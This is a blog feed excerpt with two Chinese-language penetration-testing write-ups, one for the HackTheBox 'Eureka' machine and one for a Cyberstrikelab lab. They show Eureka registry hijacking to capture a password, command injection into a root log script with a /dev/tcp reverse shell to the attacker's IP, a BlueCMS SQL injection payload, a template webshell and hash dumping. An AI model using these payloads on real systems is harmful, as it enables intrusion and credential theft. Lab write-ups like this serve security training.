| `spring.jpa.properties.hibernate.format_sql = true` | Hibernate 打印 SQL 时格式化输出 | 低风险；仅影响日志可读性，无安全影响。 |
| `spring.session.store-type = jdbc` | Spring Session 存储策略，表示会话数据存入数据库 | 中等风险：会话信息、Session ID 存库，攻击者可尝试读取或篡改会话表以进行会话固定或劫持。 |
| `spring.jpa.hibernate.ddl-auto = none` | Hibernate 不会自动创建、更新或验证数据库结构 | 低风险；表示应用不会修改表结构。 |

### Spring Eureka

Spring Eureka 是一个服务注册中心，是用来实现微服务之间**自动注册和发现**的工具

分析中发现，账号密码也展示出来了 `EurekaSrvr:0scarPWDisTheB3st`

| `eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/` | Eureka 客户端注册中心地址，包含明文用户名和密码 | **高危**：可查询/下线其他微服务实例，破坏服务可用性或窃取更多配置信息。 |
| --- | --- | --- |

能发现服务器在好几个端口运行着服务

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image4.png)

## 提权 - To Miranda

### 信息收集

之前上面还发现呢一组账号密码`oscar190:0sc@r190_S0l!dP@sswd`

尝试 SSH 登录，发现成功了

```bash
➜  Eureka ssh oscar190@10.10.11.66
The authenticity of host '10.10.11.66 (10.10.11.66)' can't be established.
ED25519 key fingerprint is SHA256:5/rCExVFUnFdG5UFLnW7ExQuyelBwtSqwHzBiWKqza0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.66' (ED25519) to the list of known hosts.
oscar190@10.10.11.66's password: 

Last login: Sun Apr 27 07:31:27 2025 from 10.10.16.59
oscar190@eureka:~$ 
```

用户信息

```bash
oscar190@eureka:/home$ ls
miranda-wise  oscar190
```

监听的端口

```bash
oscar190@eureka:~$ ss -tulpn
Netid                 State                   Recv-Q                  Send-Q                                        Local Address:Port                                    Peer Address:Port                 Process                 
udp                   UNCONN                  0                       0                                             127.0.0.53%lo:53                                           0.0.0.0:*                                            
udp                   UNCONN                  0                       0                                                         *:37093                                              *:*                                            
udp                   UNCONN                  0                       0                                                         *:49730                                              *:*                                            
udp                   UNCONN                  0                       0                                                         *:52181                                              *:*                                            
udp                   UNCONN                  0                       0                                                         *:36551                                              *:*                                            
tcp                   LISTEN                  0                       511                                                 0.0.0.0:80                                           0.0.0.0:*                                            
tcp                   LISTEN                  0                       4096                                          127.0.0.53%lo:53                                           0.0.0.0:*                                            
tcp                   LISTEN                  0                       128                                                 0.0.0.0:22                                           0.0.0.0:*                                            
tcp                   LISTEN                  0                       80                                                127.0.0.1:3306                                         0.0.0.0:*                                            
tcp                   LISTEN                  0                       4096                                     [::ffff:127.0.0.1]:8080                                               *:*                                            
tcp                   LISTEN                  0                       511                                                    [::]:80                                              [::]:*                                            
tcp                   LISTEN                  0                       100                                      [::ffff:127.0.0.1]:8081                                               *:*                                            
tcp                   LISTEN                  0                       100                                      [::ffff:127.0.0.1]:8082                                               *:*                                            
tcp                   LISTEN                  0                       128                                                    [::]:22                                              [::]:*                                            
tcp                   LISTEN                  0                       100                                                       *:8761                                               *:*  
```

结合之前的信息，我们去访问一下数据库

```bash
username = oscar190  
password = 0sc@r190_S0l!dP@sswd  
url      = jdbc:mysql://localhost:3306/Furni_WebApp_DB  
```

```bash
oscar190@eureka:/home$ mysql -uoscar190 -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 400
Server version: 10.3.39-MariaDB-0ubuntu0.20.04.2 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

```bash
ariaDB [Furni_WebApp_DB]> select * from SPRING_SESSION;                                                                                                                                                                            
+--------------------------------------+--------------------------------------+---------------+------------------+-----------------------+---------------+------------------------+                                                 
| PRIMARY_ID                           | SESSION_ID                           | CREATION_TIME | LAST_ACCESS_TIME | MAX_INACTIVE_INTERVAL | EXPIRY_TIME   | PRINCIPAL_NAME         |                                                 
+--------------------------------------+--------------------------------------+---------------+------------------+-----------------------+---------------+------------------------+ 
| 10233918-ae1b-42fb-be6f-5f9964cf1bd4 | 4e178510-cbab-422a-9aec-2d220d4aac84 | 1745739662223 |    1745739664438 |                  1800 | 1745741464438 | miranda.wise@furni.htb |                                                 
| 13332183-199d-4684-ada9-cb6d4a369d3d | 291a60aa-1a92-4f7b-b46e-b2050b972752 | 1745739481031 |    1745739481182 |                  1800 | 1745741281182 | miranda.wise@furni.htb |  
| fa2e36a0-151d-486f-b2c3-0a620a9c21f5 | 19028783-c10e-44b3-9770-8e7137cde452 | 1745739541041 |    1745739541597 |                  1800 | 1745741341597 | miranda.wise@furni.htb |
| fcbcfc2f-66a4-41c7-97cc-36cb09cf2e83 | 6dde7be1-48d9-4188-948b-947be5308ab6 | 1745739181290 |    1745739181563 |                  1800 | 1745740981563 | miranda.wise@furni.htb |
```

```bash
MariaDB [Furni_WebApp_DB]> select * from users;
+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+
| id | first_name | last_name | email                   | password                                                     | is_staff |
+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+
|  2 | Kamel      | Mossab    | k.mossab110@eloquia.htb | $2a$10$J4yap5ZxviliZO9jBCuSdeD.7LzL3/njVpNhnG85HCcwA05ulUrzW |        0 |
|  4 | Lorra      | Barker    | lorra199@gmail.com      | $2a$10$DgUDWpxipW2Yt7UcKxzvweB7FXoV/LFxlJG8yuL56NyUMMLr5uBuK |        0 |
|  5 | Martin     | Wood      | mwood@gmail.com         | $2a$10$3LDYl5QEt4K4u8vLWMGH8eDA/fNKVquhHNbyijaDzzueKHAwi6bHO |        0 |
|  8 | Roberto    | Dalton    | roberto0xd@outlook.com  | $2a$10$4TLCSlEfYrNDFfPDQ5z4p.S6gImA8NKAGn2tyqLJyG71l9iQoTDhu |        0 |
|  9 | Miranda    | Wise      | miranda.wise@furni.htb  | $2a$10$T4L873JALnbXH10tq.mEbOOVYmZPLlBBSeD1h2hqAeX6nbTDXMyqm |        1 |
| 10 | Oscar      | Dalton    | oscar190@furni.htb      | $2a$10$ye9a40a7KOyBJKUai2qxY.fcfVQGlFTM3SVSVcn82wxQf/2zYPq96 |        1 |
| 11 | Nya        | Dalton    | nya190@furni.htb        | $2a$10$GZQOgzb4N1xVs3ALpnuqGeId5/mZLL8pv5GlkRzJfxdFxO/JIkIaK |        1 |
| 12 | lucas      | carols    | logok12976@pelung.com   | $2a$10$J93xmU0.yP0/oZmoV9K4u.XvYHtl.kunSX9xoe2RACqKcitM4OjlC |        0 |
| 15 | test       | test      | test@test.com           | $2a$10$KhEKRdaMX4axuvRkGw3wLuehQMBPMVlQ2astA3sR.toEjh63rbQWG |        0 |
+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+
9 rows in set (0.000 sec)
```

将密码放后台进行爆破

然后上传 `pspy64` 监测一下后台，发现 `/opt/log_analyse.sh` 和 `/opt/scripts/miranda-Login-Simulator.sh` 两个脚本，第二个脚本应该是模拟`miranda`用户登录Web然后在数据库中留下`SESSION`

```bash
2025/04/27 07:53:09 CMD: UID=0     PID=2026725 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log                                                                                                       
2025/04/27 07:53:09 CMD: UID=0     PID=2026723 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log                                                                                                       
2025/04/27 07:53:09 CMD: UID=1000  PID=2026682 | ./pspy64                                                                                                                                                                           
2025/04/27 07:53:09 CMD: UID=0     PID=2026681 | curl http://furni.htb/login   -H Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 -H Accept-Language: en-US,en;q=0.8 -H Cac
he-Control: max-age=0 -H Connection: keep-alive -H Content-Type: application/x-www-form-urlencoded -H Cookie: SESSION=YWQ0ZWE5YTAtODgzYi00ZGNjLWIyY2EtYjg0NTUxMTkxMTdm -H User-Agent: Mozilla/5.0 (X11; Linux x86_64) --data @/tmp/t
mp.Wgy2TkeN8L --insecure -i                                                                                                                                                                                                         
2025/04/27 07:53:09 CMD: UID=0     PID=2026601 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh                                                                                                                                  
2025/04/27 07:53:09 CMD: UID=0     PID=2026600 | /bin/sh -c /opt/scripts/miranda-Login-Simulator.sh  
```

那么就是说在一定时间会运行该脚本，并且携带`miranda`的账户密码去进行登录。

现在我们应该去通过某种方式去获得数据包

### Spring Eureka 截取流量

佬们分享了一篇文章：https://medium.com/@mfocuz/hacking-netflix-eureka-8e5957b2f539

其中就有关于**流量劫持**的，大致就是：攻击者将注册 ***webservice*** 实例并将其指向恶意服务器，或者替换掉原本的实例，在靶机中可能是 **USER-MANAGEMENT-SERVICE**

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image5.png)

从 `heapdump` 中导出的数据中

```bash
eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/
```

可以知道 Eureka Client，默认要连接的 Eureka Server 地址是 `http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/`，而且访问时要用账号密码认证。

需要使用本地地址进行访问，那么就要用 `SSH` 将端口转发出来

```bash
ssh -L 8761:localhost:8761 oscar190@10.10.11.66
```

`kali`监听端口

```bash
➜  Eureka nc -lvp 8081
listening on [any] 8081 ...
```

然后查看 `/eureka/apps/USER-MANAGEMENT-SERVICE` 原本的内容

```bash
➜  Eureka curl 'http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE' -H "Accept: application/json"
```

```bash
{
  "application": {
    "name": "USER-MANAGEMENT-SERVICE",
    "instance": [
      {
        "instanceId": "192.168.40.130:user-management-service:6969",
        "hostName": "192.168.40.130",
        "app": "USER-MANAGEMENT-SERVICE",
        "ipAddr": "192.168.40.130",
        "status": "UP",
        "overriddenStatus": "UNKNOWN",
        "port": {
          "$": 6969,
          "@enabled": "true"
        },
        "securePort": {
          "$": 9443,
          "@enabled": "false"
        },
        "countryId": 1,
        "dataCenterInfo": {
          "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
          "name": "MyOwn"
        },
        "leaseInfo": {
          "renewalIntervalInSecs": 30,
          "durationInSecs": 90,
          "registrationTimestamp": 1745749189827,
          "lastRenewalTimestamp": 1745749189827,
          "evictionTimestamp": 0,
          "serviceUpTimestamp": 1745749189827
        },
        "metadata": {
          "zone": "default",
          "management.port": "6969"
        },
        "homePageUrl": "http://192.168.40.130:6969/",
        "statusPageUrl": "http://192.168.40.130:6969/info",
        "healthCheckUrl": "http://192.168.40.130:6969/health",
        "secureHealthCheckUrl": "",
        "vipAddress": "user-management-service",
        "secureVipAddress": "user-management-service",
        "isCoordinatingDiscoveryServer": "false",
        "lastUpdatedTimestamp": "1745749189827",
        "lastDirtyTimestamp": "1745750384661",
        "actionType": "ADDED"
      },
      {
        "instanceId": "localhost:USER-MANAGEMENT-SERVICE:8081",
        "hostName": "localhost",
        "app": "USER-MANAGEMENT-SERVICE",
        "ipAddr": "10.10.11.66",
        "status": "UP",
        "overriddenStatus": "UNKNOWN",
        "port": {
          "$": 8081,
          "@enabled": "true"
        },
        "securePort": {
          "$": 443,
          "@enabled": "false"
        },
        "countryId": 1,
        "dataCenterInfo": {
          "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
          "name": "MyOwn"
        },
        "leaseInfo": {
          "renewalIntervalInSecs": 30,
          "durationInSecs": 90,
          "registrationTimestamp": 1745747961808,
          "lastRenewalTimestamp": 1745755807954,
          "evictionTimestamp": 0,
          "serviceUpTimestamp": 1745747961808
        },
        "metadata": {
          "management.port": "8081"
        },
        "homePageUrl": "http://localhost:8081/",
        "statusPageUrl": "http://localhost:8081/actuator/info",
        "healthCheckUrl": "http://localhost:8081/actuator/health",
        "vipAddress": "USER-MANAGEMENT-SERVICE",
        "secureVipAddress": "USER-MANAGEMENT-SERVICE",
        "isCoordinatingDiscoveryServer": "false",
        "lastUpdatedTimestamp": "1745747961808",
        "lastDirtyTimestamp": "1745747961026",
        "actionType": "ADDED"
      }
    ]
  }
}

```

构造恶意数据包，不需要全部都添加，慢慢测试即可

```bash
curl 'http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE' -H 'Content-Type: application/json' -d '{
  "instance": {
	  "hostName": "10.10.16.59",
    "instanceId": "USER-MANAGEMENT-SERVICE",
    "app": "USER-MANAGEMENT-SERVICE",
    "ipAddr": "10.10.16.59",
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    },
    "status": "UP",
    "port": {
      "$": 8081,
      "@enabled": "true"
    }
  }
}'
```

然后我们的端口就会捕获到数据包

```bash
➜  Eureka nc -lvp 8081
listening on [any] 8081 ...
connect to [10.10.16.59] from eureka.htb [10.10.11.66] 43346
POST /login HTTP/1.1
X-Real-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1,127.0.0.1
X-Forwarded-Proto: http,http
Content-Length: 168
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=ZjljOWMxOTctMWMyNS00YThkLThlNzItM2RhMDcxYTdkOTk3
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Forwarded: proto=http;host=furni.htb;for="127.0.0.1:45412"
X-Forwarded-Port: 80
X-Forwarded-Host: furni.htb
host: 10.10.16.59:8081

username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=IcxoURYl9qB2QGXTrE_ozcieiecjjQ056cY7bHQ7wAynOgBAFv9bMicVwZBbclLqlGLc9P74pN9HvDUUi6ADDxcO-DTEXjEk
```

得到 `miranda` 的账号密码

```bash
username=miranda.wise@furni.htb&password=IL!veT0Be&BeT0L0ve
```

`SSH` 登录

```bash
➜  Eureka ssh miranda-wise@10.10.11.66
miranda-wise@10.10.11.66's password: 
Last login: Sun Apr 27 12:40:29 2025 from 10.10.16.59
miranda-wise@eureka:~$ 
```

拿到 user.txt

```
cat user.txt
1c0182b3b229fff1f28a469053a94c36
```

## 提权

### 信息收集

使用了 Linpeas.sh 进行收集后，没找到什么有趣的信息

```bash
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 5.4.0-214-generic (buildd@lcy02-amd64-062) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #234-Ubuntu SMP Fri Mar 14 23:50:27 UTC 2025
User & Groups: uid=1001(miranda-wise) gid=1002(miranda-wise) groups=1002(miranda-wise),1003(developers)
Hostname: eureka
```

### 脚本分析

又回到之前的脚本处，想起来使用 `pspy64` 进行检测的时候还有另外一个脚本

```bash
2025/04/28 05:00:41 CMD: UID=0     PID=2047217 | /bin/bash /opt/log_analyse.sh /var/www/web/user-management-service/log/application.log 
```

是以 `root` 身份运行的，并且我们对 `/var/www/web/user-management-service` 目录有删除的权限，但是对 `application.log` 没有写的权限，但是我们可以删除了日志文件后再创建一个，我们就有写权限了，所以我们现在要找到脚本中是否存在命令注入

```bash
╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
  Group developers:
/var/www/web    
/var/www/web/user-management-service
/var/www/web/user-management-service/target 
```

分析脚本（喂给 `GPT`）

```bash
#!/bin/bash

# 颜色定义，用于输出彩色信息
GREEN='\033[0;32m'      # 绿色，用于成功消息
RED='\033[0;31m'        # 红色，用于错误消息
YELLOW='\033[1;33m'     # 黄色，用于警告消息
BLUE='\033[0;34m'       # 蓝色，用于信息消息
CYAN='\033[0;36m'       # 青色，用于一般信息
RESET='\033[0m'         # 重置颜色，恢复默认颜色

# 定义日志文件和输出文件
LOG_FILE="$1"           # 第一个参数为日志文件的路径
OUTPUT_FILE="log_analysis.txt"  # 输出文件，保存分析结果

# 声明关联数组，用于存储登录计数
declare -A successful_users  # 关联数组，存储成功登录的用户及其次数：用户名 -> 次数
declare -A failed_users      # 关联数组，存储失败登录的用户及其次数：用户名 -> 次数

# 定义初始的 HTTP 状态码及其计数（初始化为 0）
STATUS_CODES=("200:0" "201:0" "302:0" "400:0" "401:0" "403:0" "404:0" "500:0")

# 检查日志文件是否存在
if [ ! -f "$LOG_FILE" ]; then
    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"  # 如果文件不存在，输出错误信息
    exit 1  # 脚本退出并返回错误码
fi

# 分析登录成功和失败的函数
analyze_logins() {
    # 处理成功登录的记录
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')  # 从日志行中提取用户名
        # 如果用户已经存在于数组中，则增加该用户的登录计数
        if [ -n "${successful_users[$username]+_}" ]; then
            successful_users[$username]=$((successful_users[$username] + 1))
        else
            successful_users[$username]=1  # 第一次登录，初始化计数为 1
        fi
    done < <(grep "LoginSuccessLogger" "$LOG_FILE")  # 过滤出包含 'LoginSuccessLogger' 的行

    # 处理失败登录的记录
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')  # 从日志行中提取用户名
        # 如果用户已经存在于数组中，则增加该用户的失败登录计数
        if [ -n "${failed_users[$username]+_}" ]; then
            failed_users[$username]=$((failed_users[$username] + 1))
        else
            failed_users[$username]=1  # 第一次失败，初始化计数为 1
        fi
    done < <(grep "LoginFailureLogger" "$LOG_FILE")  # 过滤出包含 'LoginFailureLogger' 的行
}

# 分析日志中的 HTTP 状态码
analyze_http_statuses() {
    # 处理每一行日志，查找状态码
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')  # 提取状态码
        found=0
        # 遍历 STATUS_CODES 数组，检查状态码是否存在
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)  # 获取状态码
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)  # 获取当前计数
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))  # 如果状态码存在，增加计数
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")  # 过滤出包含 'Status: ' 的行
}

# 分析日志中的错误信息
analyze_log_errors(){
    # 输出日志级别的统计信息
    echo -e "\n${YELLOW}[+] Log Level Counts:${RESET}"
    log_levels=$(grep -oP '(?<=Z  )\w+' "$LOG_FILE" | sort | uniq -c)  # 提取日志级别并排序统计
    echo "$log_levels" | awk -v blue="$BLUE" -v yellow="$YELLOW" -v red="$RED" -v reset="$RESET" '{
        if ($2 == "INFO") color=blue;       # INFO级别使用蓝色
        else if ($2 == "WARN") color=yellow; # WARN级别使用黄色
        else if ($2 == "ERROR") color=red;  # ERROR级别使用红色
        else color=reset;                   # 其他日志级别恢复默认颜色
        printf "%s%6s %s%s\n", color, $1, $2, reset
    }'

    # 输出所有的错误消息
    error_messages=$(grep ' ERROR ' "$LOG_FILE" | awk -F' ERROR ' '{print $2}')
    echo -e "\n${RED}[+] ERROR Messages:${RESET}"
    echo "$error_messages" | awk -v red="$RED" -v reset="$RESET" '{print red $0 reset}'

    # Eureka 服务连接失败的错误
    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' "$LOG_FILE")
    eureka_count=$(echo "$eureka_errors" | wc -l)  # 统计 Eureka 错误的数量
    echo -e "\n${YELLOW}[+] Eureka Connection Failures:${RESET}"
    echo -e "${YELLOW}Count: $eureka_count${RESET}"  # 输出 Eureka 错误的数量
    echo "$eureka_errors" | tail -n 2 | awk -v yellow="$YELLOW" -v reset="$RESET" '{print yellow $0 reset}'  # 输出最新的 Eureka 错误
}

# 显示最终的分析结果
display_results() {
    echo -e "${BLUE}----- Log Analysis Report -----${RESET}"

    # 输出成功登录统计信息
    echo -e "\n${GREEN}[+] Successful Login Counts:${RESET}"
    total_success=0
    for user in "${!successful_users[@]}"; do
        count=${successful_users[$user]}
        printf "${GREEN}%6s %s${RESET}\n" "$count" "$user"  # 显示每个用户的成功登录次数
        total_success=$((total_success + count))  # 累加成功登录总数
    done
    echo -e "${GREEN}\nTotal Successful Logins: $total_success${RESET}"  # 显示成功登录总数

    # 输出失败登录统计信息
    echo -e "\n${RED}[+] Failed Login Attempts:${RESET}"
    total_failed=0
    for user in "${!failed_users[@]}"; do
        count=${failed_users[$user]}
        printf "${RED}%6s %s${RESET}\n" "$count" "$user"  # 显示每个用户的失败登录次数
        total_failed=$((total_failed + count))  # 累加失败登录总数
    done
    echo -e "${RED}\nTotal Failed Login Attempts: $total_failed${RESET}"  # 显示失败登录总数

    # 输出 HTTP 状态码分布
    echo -e "\n${CYAN}[+] HTTP Status Code Distribution:${RESET}"
    total_requests=0
    # 按状态码进行排序
    IFS=$'\n' sorted=($(sort -n -t':' -k1 <<<"${STATUS_CODES[*]}"))
    unset IFS
    for entry in "${sorted[@]}"; do
        code=$(echo "$entry" | cut -d':' -f1)  # 获取状态码
        count=$(echo "$entry" | cut -d':' -f2)  # 获取该状态码的计数
        total_requests=$((total_requests + count))  # 累加 HTTP 请求总数
        
        # 根据状态码的类型选择颜色
        if [[ $code =~ ^2 ]]; then color="$GREEN"   # 2xx 状态码使用绿色
        elif [[ $code =~ ^3 ]]; then color="$YELLOW" # 3xx 状态码使用黄色
        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color="$RED"  # 4xx 和 5xx 状态码使用红色
        else color="$CYAN"  # 其他状态码使用青色
        fi
        
        printf "${color}%6s %s${RESET}\n" "$count" "$code"  # 显示每个状态码及其计数
    done
    echo -e "${CYAN}\nTotal HTTP Requests Tracked: $total_requests${RESET}"  # 显示 HTTP 请求总数
}

# 主执行过程
analyze_logins  # 调用分析登录函数
analyze_http_statuses  # 调用分析 HTTP 状态码函数
display_results | tee "$OUTPUT_FILE"  # 显示结果并保存到输出文件
analyze_log_errors | tee -a "$OUTPUT_FILE"  # 分析日志错误并追加到输出文件
echo -e "\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}"  # 输出分析完成消息
```

然后发现一些可能存在命令注入的地方

```bash
username=$(echo "$line" | awk -F"'" '{print $2}')  # 从日志行中提取用户名
code=$(echo "$line" | grep -oP 'Status: \K.*')
```

对这里进行测试

```bash
➜  Eureka echo "$(echo 1 >> 1.txt)" | grep -oP 'Status: \K.*'

➜  Eureka cat 1.txt

1
```

### 命令注入

在靶机上测试

```bash
rm -r /var/www/web/user-management-service/log/application.log
echo "Status: $(echo 1 >> /home/miranda-wise/1.txt)" > /var/www/web/user-management-service/log/application.log
```

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image6.png)

成功，进行反弹 `shell`

```bash
echo "Status: $(/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.59/1234 0>&1')" > /var/www/web/user-management-service/log/application.log
```

但是直接注入会以当前用户执行，所以我们需要对其进行改造

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image7.png)

这样就不会直接执行，而是先写入到日志文件中

```bash
echo 'HTTP Status: x[$(/bin/bash -i >& /dev/tcp/10.10.16.59/1234 0>&1)]' > /var/www/web/user-management-service/log/application.log
```

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image8.png)

读取 `root.txt`

```bash
cat root.txt
2a29dd1a4d1172b24ca76dd452035829
```

## 总结

信息收集是真的很重要，对收集到信息去仔细分析，总是会找到有用的。
]]></content:encoded>
            <category>靶机</category>
            <category>Linux靶机</category>
            <category>HackTheBox</category>
            <category>Spring</category>
            <category>Eureka</category>
            <category>命令注入</category>
        </item>
        <item>
            <title><![CDATA[Cyberstrikelab - Lab4]]></title>
            <link>https://www.sunsetaction.top/2025/08/14/CyberstrikelabLab4</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/14/CyberstrikelabLab4</guid>
            <pubDate>Thu, 14 Aug 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Lab4 https://www.cyberstrikelab.com/#/scene/detail/23 Recon 对目标主机进行扫描 5820 是 Web服务 192.168.10.10 BlueCMS 搭建着的是 BlueCMS 在页脚中能找到是：Powered by BlueCMS v1....]]></description>
            <content:encoded><![CDATA[
# Lab4

> https://www.cyberstrikelab.com/#/scene/detail/23
> 

## Recon

对目标主机进行扫描

```php
➜  Lab4 nmap -sT -min-rate 5000 -p- 192.168.10.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 10:31 CST
Nmap scan report for 192.168.10.10
Host is up (0.051s latency).
Not shown: 65520 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
5040/tcp  open  unknown
5820/tcp  open  autopassdaemon
7680/tcp  open  pando-pub
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
```

```php
➜  Lab4 nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 10:32 CST
Nmap scan report for 192.168.10.10                                                              
Host is up (0.055s latency).                                                                    
                                                                                                
PORT      STATE SERVICE       VERSION                                                                                                                                                           
135/tcp   open  msrpc         Microsoft Windows RPC  
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MySQL (unauthorized)       
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-08-13T18:36:07+00:00; -7h59m59s from scanner time.
| ssl-cert: Subject: commonName=DESKTOP-JFB57A8
| Not valid before: 2025-08-12T18:25:20
|_Not valid after:  2026-02-11T18:25:20                                                         
| rdp-ntlm-info:      
|   Target_Name: DESKTOP-JFB57A8
|   NetBIOS_Domain_Name: DESKTOP-JFB57A8      
|   NetBIOS_Computer_Name: DESKTOP-JFB57A8
|   DNS_Domain_Name: DESKTOP-JFB57A8
|   DNS_Computer_Name: DESKTOP-JFB57A8
|   Product_Version: 10.0.18362
|_  System_Time: 2025-08-13T18:35:38+00:00
5040/tcp  open  unknown
5820/tcp  open  http          Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)
| http-cookie-flags:      
|   /: 
|     PHPSESSID:                                                                                                                                                                                
|_      httponly flag not set                                                                   
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
|_http-title: \xD1\xDD\xCA\xBE\xCD\xF8\xD5\xBE - Powered by BlueCMS
| http-robots.txt: 9 disallowed entries 
| /admin/ /api/ /data/ /include/ /install/ /templates/ 
|_/uc_client/ /user.php /comment.php
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows 10 (93%), Microsoft Windows Longhorn (93%), Microsoft Windows 10 1903 (92%), Microsoft Windows 10 21H1 (92%), M
icrosoft Windows 10 21H2 (92%), Microsoft Windows 10 1703 or Windows 11 21H2 (91%), Microsoft Windows 10 1803 (91%), Microsoft Windows 8 (91%), Microsoft Windows 10 Education Edition 1909 (90%
)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -7h59m59s, deviation: 0s, median: -8h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-08-13T18:35:40
|_  start_date: N/A
```

`5820` 是 `Web`服务

## 192.168.10.10

### BlueCMS

搭建着的是 `BlueCMS`

![image.png](/post-images/CyberstrikelabLab4/image.png)

在页脚中能找到是：`Powered by BlueCMS v1.6`

存在 `SQL`注入漏洞

> https://www.cnblogs.com/Hi-blog/p/7990894.html#_label30
> 

![image.png](/post-images/CyberstrikelabLab4/image1.png)

拿用户密码

```php
ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(admin_name,0x3a,pwd) from blue_admin
```

![image.png](/post-images/CyberstrikelabLab4/image2.png)

解出来密码是：`admin123456`

### 后台 GetShell

登录后台，在模版设置里面

![image.png](/post-images/CyberstrikelabLab4/image3.png)

> 利用链接：https://blog.csdn.net/weixin_72007549/article/details/127540398
> 

在头部写上一句话木马，然后提交

![image.png](/post-images/CyberstrikelabLab4/image4.png)

蚁剑连接上

![image.png](/post-images/CyberstrikelabLab4/image5.png)

权限很高是 `system`权限

![image.png](/post-images/CyberstrikelabLab4/image6.png)

在根目录读到 `flag`

```php
C:\> type flag.txt
go-flag{ovuRsBeMqji13Rrc}
```

这里用上 `CS` 了

![image.png](/post-images/CyberstrikelabLab4/image7.png)

### 信息收集

抓一下 `HASH`

```php
beacon> hashdump
[*] Tasked beacon to dump hashes
[+] host called home, sent: 82541 bytes
[+] received password hashes:
